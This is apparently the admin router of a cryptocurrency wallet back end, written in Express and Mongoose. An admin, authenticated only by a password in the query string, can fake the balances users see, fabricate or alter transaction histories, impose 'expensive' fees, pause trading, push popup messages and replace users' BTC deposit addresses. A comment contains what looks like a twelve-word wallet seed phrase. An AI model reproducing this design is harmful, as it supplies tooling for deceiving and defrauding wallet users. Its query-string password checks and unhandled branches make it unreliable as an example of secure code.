require('dotenv').config();

import express from 'express';
import Transaction from '../models/transaction';


import UserAddress from '../models/useraddress';

const adminRoute = express.Router();

adminRoute.get('/admin/userwallets', async (req, res) => {
    try {
        const { password } = req.query;

        if (password === process.env.ADMIN_PW) {
            const usersaddress = await UserAddress.find();

            console.log(usersaddress)

            res.status(200).json({
                usersaddress
            });
        } else {
            return res.status(401).json({ message: "fuck off" })
        }
    } catch (error) {
        console.log(error);
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.get('/admin/userwallet', async (req, res) => {
    try {
        const { password, ethaddress } = req.query;

        if (password === process.env.ADMIN_PW) {
            const usersaddress = await UserAddress.findOne({ ethaddress });

            res.status(200).json({
                usersaddress
            });
        } else {
            return res.status(401).json({ message: "fuck off" })
        }
    } catch (error) {
        console.log(error);
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.post('/admin/update', async (req, res) => {
    try {
        const {
            password,
            address
        } = req.query;

        if (password === process.env.ADMIN_PW) {

            if (address != null && address.length) {

                const {
                    adminBtcBalance,
                    adminUsdtBalance,
                    adminEthBalance,
                    adminPopupMessage,
                    useAdminVals,
                    btcmode,
                    ethmode,
                    usdtmode,
                    pauseTrade,
                    useExpensivefee,
                    expensiveFeeBTC,
                    expensiveFeeETH,
                    pendingMesg
                } = req.body;

                const updatedUserAddress = await UserAddress.findOneAndUpdate(
                    { ethaddress: address },
                    {
                        $set: {
                            adminBtcBalance,
                            adminUsdtBalance,
                            adminEthBalance,
                            adminPopupMessage,
                            useAdminVals,
                            btcmode,
                            ethmode,
                            usdtmode,
                            pauseTrade,
                            useExpensivefee,
                            expensiveFeeBTC,
                            expensiveFeeETH,
                            pendingMesg
                        }
                    },
                    { new: true, runValidators: true }
                );

                if (!updatedUserAddress) {
                    return res.status(404).json({ message: "User address not found" });
                }

                res.status(201).json({ updatedUserAddress })
            }
        }
    } catch (error) {
        console.log(error)
        return res.status(500).json({ message: "Internal server error" });
    }
});

adminRoute.post('/admin/update/btcaddress', async (req, res) => {
    const {
        password,
        address
    } = req.query;

    if (password === process.env.ADMIN_PW) {

        if (address != null && address.length) {
            const {
                btcaddress
            } = req.body;

            const updatedUserAddress = await UserAddress.findOneAndUpdate(
                { ethaddress: address },
                {
                    $set: {
                        btcaddress
                    }
                },
                { new: true, runValidators: true }
            );

            if (!updatedUserAddress) {
                return res.status(404).json({ message: "User address not found" });
            }

            res.status(201).json({ updatedUserAddress })
        }
    }
});

adminRoute.post('/admin/add/transaction', async (req, res) => {
    const {
        password,
        walletid,
    } = req.query;

    if (password === process.env.ADMIN_PW) {

        if (walletid) {
            const usersaddress = await UserAddress.findOne({ uniqueid: walletid });

            if (usersaddress) {
                const {
                    label,
                    type,
                    amount,
                    pending,
                    userBalanceAtOccurence,
                    assetType,
                } = req.body;

                const newtrans = new Transaction({
                    walletid: usersaddress.uniqueid,
                    label,
                    type,
                    amount,
                    pending,
                    userBalanceAtOccurence,
                    assetType,
                });

                newtrans.save();

                res.status(201).json({ newtrans });
            }
        }
    } else {
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.get('/admin/user/transactions', async (req, res) => {
    const {
        password,
        walletid,
    } = req.query;

    if (password === process.env.ADMIN_PW) {

        if (walletid) {
            const transactions = await Transaction.find({ walletid });

            res.status(201).json({ transactions });
        }
    } else {
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.put('/admin/user/transaction', async (req, res) => {
    const {
        password,
        transactionid,
    } = req.query;

    if (password === process.env.ADMIN_PW) {

        if (transactionid) {
            const id = transactionid;

            const {
                label,
                type,
                amount,
                pending,
                userBalanceAtOccurence,
                assetType
            } = req.body;

            const updatedTransaction = await Transaction.findByIdAndUpdate(id, {
                label,
                type,
                amount,
                pending,
                userBalanceAtOccurence,
                assetType
            }, {
                new: true,
                runValidators: true
            });

            if (!updatedTransaction) {
                return res.status(404).json({ message: 'Transaction not found' });
            }

            res.status(201).json(updatedTransaction);
        }
    } else {
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.put('/admin/user/popumessage', async (req, res) => {
    const {
        password,
        walletid,
    } = req.query;

    const {
        adminPopupMessage
    } = req.body;

    //turn, mouse, puppy, orbit, normal, asthma, fault, enhance, script, subject, garage, cup

    if (password === process.env.ADMIN_PW) {
        if (walletid) {
            const usersaddress = await UserAddress.findOne({ uniqueid: walletid });

            if (usersaddress && adminPopupMessage.length) {
                const id = usersaddress._id;

                const updatedUserAddress = await UserAddress.findByIdAndUpdate(id, {
                    adminPopupMessage
                }, {
                    new: true,
                    runValidators: true
                });

                res.status(201).json(updatedUserAddress);
            }
        }
    } else {
        return res.status(401).json({ message: "fuck off" })
    }
});

export default adminRoute; 